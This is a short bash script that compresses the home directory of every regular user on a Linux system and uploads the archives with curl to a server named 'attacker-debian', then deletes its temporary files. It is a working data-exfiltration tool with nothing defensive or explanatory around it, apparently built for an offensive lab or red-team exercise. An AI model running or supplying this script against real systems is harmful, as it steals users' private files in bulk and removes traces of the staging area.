#!/bin/bash

#Upload server url
UPLOAD_SERVER=http://attacker-debian:3000/upload

# create temporary directory to store zipped home directories
rm -r /tmp/user_homes
mkdir -p /tmp/user_homes

# loop through regular users and compress their home directories
for i in $(getent passwd | awk -F: '$3 >= 1000 && $3 != 65534 {print $1}'); do
    tar -zcvf /tmp/user_homes/"$i".tar.gz /home/"$i"
done

# upload zipped home directories to upload server
for i in /tmp/user_homes/*.tar.gz; do
    curl -F "file=@$i" $UPLOAD_SERVER
done

# remove temporary directory
rm -r /tmp/user_homes
